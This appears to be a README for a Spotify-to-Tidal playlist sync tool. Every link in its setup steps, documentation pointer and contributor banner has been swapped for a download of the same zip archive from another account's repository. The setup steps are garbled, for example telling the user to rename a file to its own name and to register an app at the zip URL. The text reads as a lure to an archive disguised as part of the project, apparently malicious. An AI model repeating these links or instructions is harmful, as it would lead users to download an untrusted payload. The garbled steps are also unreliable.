A command line tool for importing your Spotify playlists into Tidal. Due to various performance optimisations, it is particularly suited for periodic synchronisation of very large collections.

Installation
-----------
Clone this git repository and then run:

```bash
python3 -m pip install -e .
```

Setup
-----
0. Rename the file https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip to https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip
0. Go [here](https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip) and register a new app on https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip
0. Copy and paste your client ID and client secret to the Spotify part of the config file
0. Copy and paste the value in 'redirect_uri' of the config file to Redirect URIs at https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip and press ADD
0. Enter your Spotify username to the config file

Usage
----
To synchronize all of your Spotify playlists with your Tidal account run the following from the project root directory
Windows ignores python module paths by default, but you can run them using `python3 -m spotify_to_tidal`

```bash
spotify_to_tidal
```

You can also just synchronize a specific playlist by doing the following:

```bash
spotify_to_tidal --uri 1ABCDEqsABCD6EaABCDa0a # accepts playlist id or full playlist uri
```

or sync just your 'Liked Songs' with:

```bash
spotify_to_tidal --sync-favorites
```

See https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip for more configuration options, and `spotify_to_tidal --help` for more options.

---

#### Join our amazing community as a code contributor
<br><br>
<a href="https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip">
  <img class="dark-light" src="https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip" />
</a>
